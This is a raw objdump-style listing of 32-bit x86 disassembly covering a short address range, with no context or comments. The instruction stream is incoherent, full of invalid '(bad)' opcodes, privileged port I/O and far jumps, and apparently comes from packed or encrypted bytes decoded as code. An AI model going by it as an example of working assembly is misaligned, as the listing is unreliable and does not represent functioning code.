  4137ee:	mov    bl,0xba
  4137f0:	fcom   QWORD PTR [ecx+0xf]
  4137f3:	fs lock sbb ebp,0x95e3d27e
  4137fb:	aaa    
  4137fc:	loope  0x41380f
  4137fe:	rol    esi,cl
  413800:	push   edi
  413801:	add    eax,edx
  413803:	jmp    0xa8af:0xf5241cda
  41380a:	icebp  
  41380b:	inc    ecx
  41380c:	cs pushf 
  41380e:	cmp    edx,DWORD PTR [edi]
  413810:	and    ecx,esp
  413812:	and    ecx,DWORD PTR [edi+ebx*2-0x32]
  413816:	out    dx,eax
  413817:	jnp    0x4137ab
  413819:	xor    al,0xe
  41381b:	mov    cl,0xae
  41381d:	xchg   BYTE PTR [ebp+0x32],bh
  413820:	dec    esi
  413821:	in     al,dx
  413822:	cmp    eax,0xe909958a
  413827:	pop    ebx
  413828:	sub    al,0x72
  41382a:	pop    ss
  41382b:	push   ds
  41382c:	xchg   esp,eax
  41382d:	popa   
  41382e:	cld    
  41382f:	scas   al,BYTE PTR es:[edi]
  413830:	xlat   BYTE PTR ds:[ebx]
  413831:	stc    
  413832:	inc    esp
  413833:	setne  BYTE PTR [eax+0x710f16c7]
  41383a:	jmp    0xbad91e8d
  41383f:	xchg   ebx,eax
  413840:	lods   al,BYTE PTR ds:[esi]
  413841:	or     esp,DWORD PTR [esi+edi*8+0x3ba4feb2]
  413848:	or     BYTE PTR ds:0xdd73ee2d,al
  41384e:	sbb    ch,ch
  413850:	push   edx
  413851:	adc    BYTE PTR [ecx],0x40
  413854:	dec    edi
  413855:	outs   dx,BYTE PTR ds:[esi]
  413856:	ins    DWORD PTR es:[edi],dx
  413857:	scas   al,BYTE PTR es:[edi]
  413858:	jo     0x413805
  41385a:	ins    DWORD PTR es:[edi],dx
  41385b:	loop   0x413842
  41385d:	ficom  WORD PTR [ecx]
  41385f:	adc    bl,BYTE PTR [edx*8+0x1546c457]
  413866:	fidiv  DWORD PTR [ecx+0x2a]
  413869:	mov    dl,0xf1
  41386b:	xor    eax,0xbd6a411a
  413870:	xchg   ebx,eax
  413871:	mov    ebx,ss
  413873:	jmp    DWORD PTR [esi-0x45]
  413876:	add    al,0xcb
  413878:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413879:	mov    edi,0xbb1f5c13
  41387e:	cmp    al,0xde
  413880:	mov    DWORD PTR [esi-0x2c],0xa09cbc0f
  413887:	dec    esp
  413888:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413889:	cli    
  41388a:	cmp    ebp,DWORD PTR [ebx-0x48]
  41388d:	in     al,dx
  41388e:	xor    BYTE PTR [eax],0xcc
  413891:	xchg   esi,eax
  413892:	and    DWORD PTR [esi*4+0x5e295314],ecx
  413899:	xchg   ebp,eax
  41389a:	mov    ah,0xdd
  41389c:	dec    edx
  41389d:	mov    ecx,0x36b78de2
  4138a2:	dec    edi
  4138a3:	or     bh,ch
  4138a5:	push   ds
  4138a6:	fcom   DWORD PTR [ecx+0x59]
  4138a9:	rcl    BYTE PTR [edi],1
  4138ab:	cs mov ebp,0xfa77462a
  4138b1:	out    dx,al
  4138b2:	rcl    DWORD PTR [edi+0x24],1
  4138b5:	inc    edi
  4138b6:	imul   eax,DWORD PTR [eax],0xd20b9105
  4138bc:	pushf  
  4138bd:	(bad)  [ebp+0x3a]
  4138c0:	push   edx
  4138c1:	sbb    al,0xa5
  4138c3:	std    
  4138c4:	push   eax
  4138c5:	push   0xffffff81
  4138c7:	dec    ebp
  4138c8:	test   cl,bl
  4138ca:	sub    ebp,edx
  4138cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138cd:	xor    al,al
  4138cf:	xor    esi,edx
  4138d1:	sar    BYTE PTR [eax],0x44
  4138d4:	dec    eax
  4138d5:	and    eax,DWORD PTR [eax+0x51]
  4138d8:	or     bl,BYTE PTR [ecx]
  4138da:	call   0x854f:0x95d6
  4138e0:	push   ds
  4138e1:	or     dl,BYTE PTR [edx+0x52]
  4138e4:	les    edi,FWORD PTR [eax]
  4138e6:	cdq    
  4138e7:	add    edi,esi
  4138e9:	lods   eax,DWORD PTR ds:[esi]
  4138ea:	mov    al,0x14
  4138ec:	add    esp,DWORD PTR ds:0x95957b83
  4138f2:	sbb    ah,cl
  4138f4:	ss push es
  4138f6:	mov    ds:0xe4def02f,al
  4138fb:	jo     0x413892
  4138fd:	shr    ebp,cl
  4138ff:	(bad)  
  413901:	add    cl,0x88
  413904:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413905:	nop
  413906:	cmp    al,0x4b
  413908:	pusha  
  413909:	ins    BYTE PTR es:[edi],dx
  41390a:	fwait
  41390b:	scas   al,BYTE PTR es:[edi]
  41390c:	in     al,0x3c
  41390e:	mov    esi,0xe03de402
  413913:	xchg   edx,eax
  413914:	aaa    
  413915:	mov    eax,ds:0x823304f4
  41391a:	mov    al,BYTE PTR [esi-0x55]
  41391d:	push   cs
  41391e:	popa   
  41391f:	dec    ecx
  413920:	xor    DWORD PTR [edx-0x5b],ebx
  413923:	sub    eax,0x1b2a10b3
  413928:	pop    edx
  413929:	in     eax,dx
  41392a:	aad    0x2b
  41392c:	inc    ebp
  41392d:	mov    esp,0xc5fc2339
  413932:	dec    edx
  413933:	clc    
  413934:	mov    bl,0xe6
  413936:	mov    bh,0x63
  413938:	fwait
  413939:	mov    ah,0x24
  41393b:	mov    ebx,0xa2b785d
  413940:	retf   
  413941:	dec    edx
  413942:	sub    eax,0x9705479f
  413947:	sbb    al,0x23
  413949:	stos   BYTE PTR es:[edi],al
  41394a:	fs inc esi
  41394c:	fadd   st(5),st
  41394e:	sub    al,0x0
  413950:	or     edx,eax
  413952:	xchg   ebp,eax
  413953:	add    DWORD PTR [ecx-0x6a1c174e],ebx
  413959:	push   es
  41395a:	xchg   edx,eax
  41395b:	cld    
  41395c:	lahf   
  41395d:	inc    esi
  41395e:	out    dx,eax
  41395f:	jnp    0x413985
  413961:	dec    BYTE PTR [ebx-0x72]
  413964:	pop    edx
  413965:	aaa    
  413966:	sub    BYTE PTR [esi],dl
  413968:	lock dec DWORD PTR [edx-0x20]
  41396c:	popa   
  41396d:	xchg   edi,eax
  41396e:	adc    al,0xfd
  413970:	imul   esp,DWORD PTR [edi+0x1fc2114a],0xdd0e8db4
  41397a:	pusha  
  41397b:	push   ss
  41397c:	push   0x849ed0ae
  413981:	dec    esi
  413982:	cli    
  413983:	mov    ebp,DWORD PTR [esi]
  413985:	ins    DWORD PTR es:[edi],dx
  413986:	cmp    edx,DWORD PTR [esp+ecx*1+0x2cf748c6]
  41398d:	pop    ds
  41398e:	sub    eax,0xf16675fd
  413993:	mov    bh,0x16
  413995:	cld    
  413996:	fldcw  WORD PTR [ebx+0x6bf21b5e]
  41399c:	lods   al,BYTE PTR ds:[esi]
  41399d:	lods   eax,DWORD PTR ds:[esi]
  41399e:	inc    esi
  41399f:	and    DWORD PTR [esi],edx
  4139a1:	enter  0x4963,0x9a
  4139a5:	aaa    
  4139a6:	aam    0x50
  4139a8:	clc    
  4139a9:	fsub   DWORD PTR [edx]
  4139ab:	jae    0x413952
  4139ad:	dec    edi
  4139ae:	(bad)  
  4139af:	jno    0x413a03
  4139b1:	scas   al,BYTE PTR es:[edi]
  4139b2:	lahf   
  4139b3:	mov    dl,0x1d
  4139b5:	fild   WORD PTR [ecx+0x26]
  4139b8:	das    
  4139b9:	or     dh,BYTE PTR [edx+0x79f1c5c]
  4139bf:	ficom  DWORD PTR [edi+0x4ae9718]
  4139c5:	jnp    0x413959
  4139c7:	mov    bl,0x68
  4139c9:	pop    ecx
  4139ca:	psrld  mm7,QWORD PTR [ecx+0x54b77fa7]
  4139d1:	cwde   
  4139d2:	fst    QWORD PTR [esi+0x1b]
  4139d5:	cld    
  4139d6:	js     0x41395a
  4139d8:	fild   WORD PTR [esi]
  4139da:	rcr    DWORD PTR [edi],0x3e
  4139dd:	lahf   
  4139de:	and    eax,0x62e751a4
  4139e3:	sbb    DWORD PTR ds:0x6f28e3c5,eax
  4139e9:	aas    
  4139ea:	in     al,dx
  4139eb:	sub    cl,al
  4139ed:	sbb    BYTE PTR [eax],0x2
  4139f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139f1:	jle    0x413979
  4139f3:	ret    0x68d
  4139f6:	cmp    DWORD PTR [edx-0x2d],ecx
  4139f9:	leave  
  4139fa:	pop    edi
  4139fb:	pop    DWORD PTR [ecx-0x6521eff]
  413a01:	sub    dh,cl
  413a03:	or     al,0x20
  413a05:	and    esi,DWORD PTR [ecx+0x50194a86]
  413a0b:	lods   eax,DWORD PTR ds:[esi]
  413a0c:	fidivr WORD PTR [ebx+0xf7b16a1]
  413a12:	sub    eax,0xa0797f2
  413a17:	jge    0x413a46
  413a19:	mov    eax,ds:0xb07a139b
  413a1e:	fs out 0x7e,al
  413a21:	jp     0x413a17
  413a23:	sbb    DWORD PTR [ebx-0x1b],ebp
  413a26:	push   ebp
  413a27:	mov    DWORD PTR [ebp+0x1fe77c34],eax
  413a2d:	(bad)  
  413a2e:	pusha  
  413a2f:	(bad)  
  413a30:	dec    eax
  413a31:	fld    DWORD PTR [ebp+0x55]
  413a34:	push   esp
  413a35:	adc    DWORD PTR fs:[ecx+0x73],edx
  413a39:	mov    ds:0xf151b744,al
  413a3e:	cmp    eax,0x467a06bb
  413a43:	mov    edi,esp
  413a45:	jns    0x413a9e
  413a47:	fadd   DWORD PTR [edx-0x28]
  413a4a:	imul   edi,DWORD PTR [esp+eiz*8+0x6],0x644ffb87
  413a52:	test   BYTE PTR [ebx],al
  413a54:	sub    al,0x3d
  413a56:	inc    ebx
  413a57:	shl    BYTE PTR [edi-0x56],1
  413a5a:	adc    edi,esp
  413a5c:	sbb    ebp,esi
  413a5e:	inc    ebx
  413a5f:	aas    
  413a60:	mov    cl,0xfc
  413a62:	rcr    DWORD PTR [edx],1
  413a64:	lock sbb BYTE PTR ds:0xc4760378,ch
  413a6b:	jp     0x413a74
  413a6d:	pop    ss
  413a6e:	sub    al,0xad
  413a70:	xchg   ecx,ebx
  413a72:	xor    dl,al
  413a74:	inc    ecx
  413a75:	dec    esi
  413a76:	rcl    al,1
  413a78:	mov    edx,0x5376f1ef
  413a7d:	jecxz  0x413a3e
  413a7f:	jns    0x413a98
  413a81:	aas    
  413a82:	dec    esi
  413a83:	pop    ds
  413a84:	jge    0x413aa9
  413a86:	adc    BYTE PTR [esi+0x47],0x28
  413a8a:	xchg   BYTE PTR [ecx+0x71818701],dl
  413a90:	lods   al,BYTE PTR ds:[esi]
  413a91:	and    al,0x71
  413a93:	imul   ebp,DWORD PTR [eax-0x362f7398],0x4567b99
  413a9d:	in     eax,0x99
  413a9f:	out    0x1b,al
  413aa1:	scas   al,BYTE PTR es:[edi]
  413aa2:	fs test BYTE PTR es:[eax+ebp*8-0x75],ah
  413aa8:	sub    ch,BYTE PTR [ebx]
  413aaa:	dec    ebx
  413aab:	or     al,0x83
  413aad:	in     al,dx
  413aae:	inc    ebp
  413aaf:	inc    edx
  413ab0:	mov    ebx,0x2f65511d
  413ab5:	iret   
  413ab6:	sub    DWORD PTR [ecx+0x5f],0xffffffa6
  413aba:	hlt    
  413abb:	cmp    al,0x31
  413abd:	jbe    0x413a9d
  413abf:	test   esp,eax
  413ac1:	pop    ds
  413ac2:	lods   eax,DWORD PTR ds:[esi]
  413ac3:	push   ds
  413ac4:	js     0x413a92
  413ac6:	(bad)  
  413ac7:	in     al,0x74
  413ac9:	mov    ?,esp
  413acb:	push   0x74e7d0cb
  413ad0:	push   ebx
  413ad1:	std    
  413ad2:	cmp    ch,BYTE PTR [ebp+0x50]
  413ad5:	xchg   edi,eax
  413ad6:	jno    0x413a72
  413ad8:	dec    esp
  413ad9:	xor    bl,dl
  413adb:	or     edi,DWORD PTR [edx-0x2]
  413ade:	and    edx,DWORD PTR [eax]
  413ae0:	inc    esp
  413ae1:	xor    eax,0x7010aff3
  413ae6:	std    
  413ae7:	inc    edx
  413ae8:	and    ecx,DWORD PTR [edi+0x32b9bca7]
  413aee:	data16 int3 
  413af0:	mov    ds:0xaea3b44a,eax
  413af5:	mov    edi,0xfd1f3f9d
  413afa:	iret   
  413afb:	or     esi,edi
  413afd:	xor    DWORD PTR [ebx+0x4a],ebp
  413b00:	sbb    DWORD PTR [edi-0x4840227f],eax
  413b06:	add    BYTE PTR [edi+0x60d6398e],al
  413b0c:	loope  0x413b5b
  413b0e:	test   DWORD PTR [ebp-0x1d8b9f13],edi
  413b14:	push   ebx
  413b15:	lahf   
  413b16:	fsubr  DWORD PTR [esi-0x5f91eed3]
  413b1c:	adc    ebp,DWORD PTR [eax+0x2d507edf]
  413b22:	call   0x182f:0x9bb215d1
  413b29:	sub    eax,0xbfabbd59
  413b2e:	std    
  413b2f:	inc    edx
  413b30:	add    esp,DWORD PTR [edi]
  413b32:	mov    ds:0xb50f85dd,al
  413b37:	mov    cs,WORD PTR [edi-0x7f]
  413b3a:	mov    eax,0xb2655e9
  413b3f:	inc    edx
  413b40:	retf   0x9e3e
  413b43:	je     0x413af1
  413b45:	repz cmp BYTE PTR [eax],cl
  413b48:	rol    BYTE PTR [esi+0x71],0xda
  413b4c:	scas   eax,DWORD PTR es:[edi]
  413b4d:	in     al,dx
  413b4e:	push   ss
  413b4f:	sbb    al,0x1f
  413b51:	bnd jno 0x413b4d
  413b54:	pop    ecx
  413b55:	sub    eax,0xfcd42a3b
  413b5a:	jge    0x413b44
  413b5c:	(bad)  [ecx]
  413b5e:	xchg   edx,eax
  413b5f:	outs   dx,DWORD PTR ds:[esi]
  413b60:	cmp    eax,0xa4e1c206
  413b65:	fld    DWORD PTR [edi+0x12abb8d6]
  413b6b:	cmc    
  413b6c:	repz retf 
  413b6e:	or     al,0x34
  413b70:	sbb    eax,0x8fc88eb4
  413b75:	aam    0x43
  413b77:	and    eax,0x6eb6a9bd
  413b7c:	dec    esp
  413b7d:	test   al,0x72
  413b7f:	lods   eax,DWORD PTR ds:[esi]
  413b80:	pop    DWORD PTR [ebx+0x7e94c686]
  413b86:	sub    ch,BYTE PTR [eax+edi*2]
  413b89:	jmp    0xfe32:0x27dbf798
  413b90:	repnz xor ch,BYTE PTR [ebp+0x149b2546]
  413b97:	dec    edi
  413b98:	push   ecx
  413b99:	inc    ebx
  413b9a:	jno    0x413bcc
  413b9c:	addr16 inc edi
  413b9e:	sub    al,0xfb
  413ba0:	xchg   edx,eax
  413ba1:	in     eax,0xc5
  413ba3:	lock repnz in eax,0x5b
  413ba7:	out    0xe5,al
  413ba9:	popf   
  413baa:	(bad)  
  413bac:	push   0x973891ba
  413bb1:	lods   eax,DWORD PTR ds:[esi]
  413bb2:	leave  
  413bb3:	add    edi,ebp
  413bb5:	icebp  
  413bb6:	repz mov cl,0xef
  413bb9:	arpl   WORD PTR [ecx+edi*2],ax
  413bbc:	in     al,dx
  413bbd:	ins    DWORD PTR es:[edi],dx
  413bbe:	repnz xchg esi,eax
  413bc0:	es jmp 0x413c29
  413bc3:	test   edx,ecx
  413bc5:	xor    BYTE PTR [ebx-0x51],dl
  413bc8:	inc    esp
  413bc9:	pop    ebp
  413bca:	sub    eax,0xa4f5d4a0
  413bcf:	sbb    al,0x24
  413bd1:	mov    esp,0x829a703b
  413bd6:	push   eax
  413bd7:	test   DWORD PTR [edi],ecx
  413bd9:	dec    edi
  413bda:	mov    al,ds:0xc2955857
  413bdf:	cmp    ebp,DWORD PTR [edi-0xcda8ea0]
  413be5:	dec    edx
  413be6:	cmp    BYTE PTR [ecx-0x41],0x93
  413bea:	(bad)  
  413beb:	pop    esp
  413bec:	out    0xf5,al
  413bee:	ja     0x413bd8
  413bf0:	add    BYTE PTR [esi+eax*2-0x235ba3ba],0x7b
  413bf8:	rol    DWORD PTR [esp+edx*1],1
  413bfb:	cdq    
  413bfc:	dec    edi
  413bfd:	jp     0x413bd5
  413bff:	xor    al,bh
  413c01:	pop    ecx
  413c02:	adc    al,0x49
  413c04:	and    bh,BYTE PTR [edx+0x24]
  413c07:	rol    BYTE PTR [ebp+0x57],0xb0
  413c0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c0c:	lahf   
  413c0d:	pop    esi
  413c0e:	push   0xfffffff7
  413c10:	in     eax,dx
  413c11:	ret    0xbf05
  413c14:	sbb    eax,0x4e85acef
  413c19:	(bad)  
  413c1a:	(bad)  
  413c1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c1d:	ss mov al,0xa
  413c20:	add    DWORD PTR [edx],edx
  413c22:	fldenv [eax-0x1030467b]
  413c28:	inc    esp
  413c29:	outs   dx,BYTE PTR ds:[esi]
  413c2a:	dec    esi
  413c2b:	lea    ebp,[esi]
  413c2d:	sar    DWORD PTR [ebx+0x19],1
  413c30:	aaa    
  413c31:	sbb    esi,DWORD PTR [edi+ecx*1+0x37b45743]
  413c38:	repnz arpl WORD PTR [ebx+0x69],bp
  413c3c:	std    
  413c3d:	cmp    BYTE PTR [eax+0x70],dl
  413c40:	push   0x683838d7
  413c45:	ins    BYTE PTR es:[edi],dx
  413c46:	leave  
  413c47:	mov    edx,DWORD PTR [ebx]
  413c49:	call   0x2811611b
  413c4e:	ins    BYTE PTR es:[edi],dx
  413c4f:	push   esi
  413c50:	pop    ebp
  413c51:	dec    ebx
  413c52:	outs   dx,BYTE PTR ds:[esi]
  413c53:	arpl   WORD PTR [esi+0x9],sp
  413c56:	adc    edi,DWORD PTR [edi-0x39]
  413c59:	int3   
  413c5a:	jb     0x413c6d
  413c5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c5d:	jl     0x413c10
  413c5f:	pusha  
  413c60:	xchg   BYTE PTR [ebp+0x5328e2a6],dh
  413c66:	adc    ebp,DWORD PTR [esi]
  413c68:	popa   
  413c69:	cmp    edi,DWORD PTR [ecx-0x74d8618f]
  413c6f:	icebp  
  413c70:	adc    eax,0x9ace0897
  413c75:	cmp    BYTE PTR cs:[esi+0x29],dl
  413c79:	aam    0x37
  413c7b:	ret    0x1ec3
  413c7e:	out    dx,eax
  413c7f:	sub    al,0x3c
  413c81:	in     eax,dx
  413c82:	sbb    BYTE PTR [edi+esi*8+0x1d94fa73],ch
  413c89:	add    DWORD PTR [eax+ecx*2-0x4762d6d9],eax
  413c90:	fcom   DWORD PTR [ebx+0x68]
  413c93:	in     eax,0x19
  413c95:	push   ss
  413c96:	inc    esp
  413c97:	pop    ecx
  413c98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c99:	sbb    al,BYTE PTR [ebx+ebp*8-0x5c147b2f]
  413ca0:	rcr    al,cl
  413ca2:	pop    esi
  413ca3:	dec    esi
  413ca4:	xchg   ecx,eax
  413ca5:	add    cl,BYTE PTR [eax-0xd9143af]
  413cab:	dec    edi
  413cac:	cli    
  413cad:	call   0x3e41:0x2c172661
  413cb4:	push   ebp
  413cb5:	call   0x17616c3b
  413cba:	mov    cl,0x52
  413cbc:	sbb    edx,edi
  413cbe:	fisttp DWORD PTR [esi+0x60c0dfdb]
  413cc4:	in     al,dx
  413cc5:	aaa    
  413cc6:	push   es
  413cc7:	icebp  
  413cc8:	pop    edx
  413cc9:	dec    ebp
  413cca:	jbe    0x413d20
  413ccc:	in     eax,0x6d
  413cce:	add    al,0x49
  413cd0:	ds mov ecx,eax
  413cd3:	or     DWORD PTR [ebx],edx
  413cd5:	fs xor eax,0xd2e87ea0
  413cdb:	(bad)  
  413cdc:	mov    ds:0xdee22f4d,al
  413ce1:	add    ah,BYTE PTR ds:0x616021e5
  413ce7:	push   ds
  413ce8:	gs mov al,0x55
  413ceb:	dec    esi
  413cec:	cmp    al,0xe4
  413cee:	add    al,0x77
  413cf0:	mov    ds:0x43fc2971,al
  413cf5:	lea    edx,[edi-0x49]
  413cf8:	xchg   ebp,eax
  413cf9:	pop    ecx
  413cfa:	mov    BYTE PTR [ebp-0x3b],dh
  413cfd:	inc    esp
  413cfe:	(bad)  [ebx-0x3e]
  413d01:	xchg   ebx,eax
  413d02:	xor    al,0xf4
  413d04:	mov    fs,WORD PTR [edx+0x7c]
  413d07:	add    DWORD PTR [ebp-0x65],esi
  413d0a:	cdq    
  413d0b:	iret   
  413d0c:	out    dx,eax
  413d0d:	jmp    0x4fa31ccb
  413d12:	jne    0x413cdb
  413d14:	xchg   ebp,eax
  413d15:	clc    
  413d16:	and    dh,BYTE PTR [ecx]
  413d18:	(bad)  
  413d19:	call   0xb345c1f0
  413d1e:	add    ah,dl
  413d20:	minps  xmm6,XMMWORD PTR [edx]
  413d23:	mov    edi,0xea8fe942
  413d28:	(bad)  
  413d29:	xchg   ebp,eax
  413d2a:	sub    bh,bh
  413d2c:	lock and ecx,edx
  413d2f:	loopne 0x413d39
  413d31:	fs call 0x81b67de1
  413d37:	mov    ?,WORD PTR [ebp+0x242a1344]
  413d3d:	in     al,0xa6
  413d3f:	sbb    ecx,ecx
  413d41:	or     eax,0xec18d519
  413d46:	mov    esi,0x8fd9187f
  413d4b:	add    al,0xa2
  413d4d:	cs ins BYTE PTR es:[edi],dx
  413d4f:	jge    0x413dc1
  413d51:	std    
  413d52:	push   ss
  413d53:	cmp    dl,BYTE PTR [edx]
  413d55:	into   
  413d56:	call   0xee85232f
  413d5b:	adc    ch,BYTE PTR [eax]
  413d5d:	jge    0x413da9
  413d5f:	pop    eax
  413d60:	jmp    0x472a01fa
  413d65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d66:	fidiv  DWORD PTR [ebx]
  413d68:	sbb    ecx,DWORD PTR [ecx+edx*8+0x38]
  413d6c:	inc    ebx
  413d6d:	pop    eax
  413d6e:	ror    DWORD PTR [ecx],cl
  413d70:	out    0xc5,eax
  413d72:	pop    ebp
  413d73:	and    eax,DWORD PTR [edi-0x7b]
  413d76:	and    edi,DWORD PTR [ebx+0x5d]
  413d79:	push   eax
  413d7a:	dec    edi
  413d7b:	fucom  st(5)
  413d7d:	jmp    0xf831c2ef
  413d82:	cld    
  413d83:	mov    eax,0x3dd3690d
  413d88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d89:	xchg   esp,ecx
  413d8b:	call   0xb7e2:0x5e40b39e
  413d92:	or     DWORD PTR [ecx-0x534f640c],edx
  413d98:	sub    ebx,DWORD PTR [edi+eiz*2-0x65f6c966]
  413d9f:	push   ebp
  413da0:	xchg   ecx,eax
  413da1:	pop    ds
  413da2:	loopne 0x413d3d
  413da4:	sbb    al,0x98
  413da6:	pop    ds
  413da7:	test   eax,0xb0fff730
  413dac:	pop    edx
  413dad:	mov    ah,0x45
  413daf:	and    ah,bl
  413db1:	adc    esi,edx
  413db3:	(bad)  
  413db4:	jno    0x413d51
  413db6:	fisubr WORD PTR [edx+0x614f8f84]
  413dbc:	enter  0xfe3d,0xae
  413dc0:	fstp   DWORD PTR [ebx-0x19]
  413dc3:	jb     0x413d46
  413dc5:	into   
  413dc6:	outs   dx,BYTE PTR ds:[esi]
  413dc7:	cmc    
  413dc8:	and    al,0x4c
  413dca:	cmc    
  413dcb:	test   DWORD PTR [eax-0x58],0x2315b9d
  413dd2:	mov    ah,0x4c
  413dd4:	pop    esi
  413dd5:	adc    dl,ah
  413dd7:	inc    edx
  413dd8:	jle    0x413df2
  413dda:	and    ah,BYTE PTR [edi+0x4c7881a8]
  413de0:	imul   eax,DWORD PTR [ebx+esi*1+0x511181ef],0x69
  413de8:	mov    esp,0xcd7d3159
  413ded:	mov    bh,0xbf
  413def:	bound  edx,QWORD PTR [ebx-0x48]
  413df2:	cli    
  413df3:	out    0x9f,al
  413df5:	xor    ebp,ecx
  413df7:	jg     0x413da5
  413df9:	dec    esi
  413dfa:	popa   
  413dfb:	jno    0x413e45
  413dfd:	sbb    al,0x3c
  413dff:	loopne 0x413e22
  413e01:	or     BYTE PTR [esi+ecx*2-0x29d7647c],ch
  413e08:	je     0x413d99
  413e0a:	jne    0x413dfa
  413e0c:	not    BYTE PTR [ecx]
  413e0e:	int    0xf8
  413e10:	cmc    
  413e11:	sub    edi,DWORD PTR [ebx]
  413e13:	cmp    DWORD PTR [ebp+0x76543e9b],ecx
  413e19:	xchg   al,bh
  413e1b:	or     eax,DWORD PTR [eax+0x65]
  413e1e:	dec    ecx
  413e1f:	lahf   
  413e20:	or     BYTE PTR [eax-0x54],bl
  413e23:	fs adc eax,0x209725ee
  413e29:	div    BYTE PTR ds:0x50a5de46
  413e2f:	sahf   
  413e30:	jmp    0x413e33
  413e32:	dec    edi
  413e33:	test   eax,0xbb152392
  413e38:	mov    bh,BYTE PTR [eax+ebp*8]
  413e3b:	test   eax,0x799a7b02
  413e40:	test   ch,al
  413e42:	mov    esp,0xe80f2f50
  413e47:	jne    0x413e3d
  413e49:	jno    0x413e99
  413e4b:	lods   eax,DWORD PTR ds:[esi]
  413e4c:	cmp    al,0xbd
  413e4e:	mov    ss,WORD PTR [esi+ebx*4]
  413e51:	pushf  
  413e52:	add    BYTE PTR [eax+0x35],cl
  413e55:	ficom  WORD PTR [edx]
  413e57:	add    bl,BYTE PTR [ecx+0x63e6bdfb]
  413e5d:	jb     0x413e24
  413e5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e60:	pop    es
  413e61:	mov    ds:0x80169398,al
  413e66:	xchg   esp,eax
  413e67:	addr16 inc ebx
  413e69:	popf   
  413e6a:	lock adc al,0x55
  413e6d:	mov    eax,ds:0xb7180a13
  413e72:	ins    DWORD PTR es:[edi],dx
  413e73:	pop    esp
  413e74:	fwait
  413e75:	sbb    eax,0xef1e09e6
  413e7a:	jmp    FWORD PTR [esi+0x46]
  413e7d:	jmp    0x413e78
  413e7f:	cmp    BYTE PTR [esi+0x78],ch
  413e82:	lods   eax,DWORD PTR ds:[esi]
  413e83:	cmp    al,0xfa
  413e85:	xchg   ebp,eax
  413e86:	call   0xacc81ab5
  413e8b:	lods   eax,DWORD PTR ds:[esi]
  413e8c:	cmp    DWORD PTR [ebp+ebx*2-0x1f1e6818],edi
  413e93:	sbb    DWORD PTR [edx-0x58773761],ebx
  413e99:	ss push eax
  413e9b:	aaa    
  413e9c:	js     0x413f00
  413e9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e9f:	and    esp,DWORD PTR [esi+0x3735317a]
  413ea5:	pop    eax
  413ea6:	inc    ebx
  413ea7:	iret   
  413ea8:	and    al,ah
  413eaa:	or     edx,eax
  413eac:	std    
  413ead:	xchg   esi,eax
  413eae:	scas   eax,DWORD PTR es:[edi]
  413eaf:	shl    eax,1
  413eb1:	imul   ecx,DWORD PTR [edi],0xca2bf648
  413eb7:	cld    
  413eb8:	inc    edx
  413eb9:	sub    al,0x3e
  413ebb:	lods   al,BYTE PTR ds:[esi]
  413ebc:	sub    edi,DWORD PTR [ebx+0x58969609]
  413ec2:	ficom  DWORD PTR [ecx+eax*8]
  413ec5:	scas   eax,DWORD PTR es:[edi]
  413ec6:	or     al,0xa8
  413ec8:	inc    edx
  413ec9:	je     0x413e90
  413ecb:	pop    es
  413ecc:	add    BYTE PTR [ebx+edi*1],cl
  413ecf:	pushf  
  413ed0:	sti    
  413ed1:	mov    DWORD PTR [edi+0x5b83600],ebx
  413ed7:	dec    esp
  413ed8:	addr16 sub eax,0x2ad3e040
  413ede:	adc    DWORD PTR [eax+edx*8+0x4749bb64],edx
  413ee5:	pop    edx
  413ee6:	fprem1 
  413ee8:	data16 (bad) 
  413eea:	sar    BYTE PTR [ebx+0x1a],0xb8
  413eee:	pop    eax
  413eef:	jl     0x413e8b
  413ef1:	sub    eax,0xfba940af
  413ef6:	inc    edx
  413ef7:	jmp    FWORD PTR [ebp+0x1e47bf51]
  413efd:	mov    ebx,0xd62ed4a8
  413f02:	stc    
  413f03:	adc    al,0xc7
  413f05:	xor    esi,DWORD PTR [ecx+ebx*8]
  413f08:	add    al,0x49
  413f0a:	outs   dx,BYTE PTR ds:[esi]
  413f0b:	(bad)  
  413f0c:	pusha  
  413f0d:	arpl   WORD PTR [eax+0x7f],cx
  413f10:	xchg   ebp,eax
  413f11:	jge    0x413f43
  413f13:	or     eax,0xe80ec003
  413f18:	add    edi,0x61dd3d4b
  413f1e:	das    
  413f1f:	in     al,dx
  413f20:	retf   0x6fcc
  413f23:	in     al,dx
  413f24:	fsub   DWORD PTR [edi+0x65]
  413f27:	adc    DWORD PTR [esi-0x60],ecx
  413f2a:	xchg   ecx,eax
  413f2b:	das    
  413f2c:	aaa    
  413f2d:	leave  
  413f2e:	cmp    BYTE PTR [ecx],0xa4
  413f31:	dec    ecx
  413f32:	shl    BYTE PTR [eax+0x69de5ce9],cl
  413f38:	push   ebp
  413f39:	push   ds
  413f3a:	int    0x3a
  413f3c:	out    0xee,al
  413f3e:	jle    0x413f4c
  413f40:	jnp    0x413f1f
  413f42:	sti    
  413f43:	or     BYTE PTR [edx],dl
  413f45:	cmp    eax,0xd6c04de4
  413f4a:	test   al,0xf8
  413f4c:	jecxz  0x413ef5
  413f4e:	sbb    al,0x96
  413f50:	sbb    BYTE PTR [ebx-0x46],ch
  413f53:	bound  ebp,QWORD PTR [esi]
  413f55:	lods   al,BYTE PTR ds:[esi]
  413f56:	mov    ds:0xf73a0ec5,al
  413f5b:	in     al,dx
  413f5c:	into   
  413f5d:	(bad)  
  413f5e:	sub    bl,BYTE PTR [esi-0x6a]
  413f61:	ins    DWORD PTR es:[edi],dx
  413f62:	sub    ebp,DWORD PTR [eax]
  413f64:	in     al,dx
  413f65:	adc    al,0x7f
  413f67:	cmp    al,0xbe
  413f69:	pop    ecx
  413f6a:	add    dh,BYTE PTR [ebx-0x2a]
  413f6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
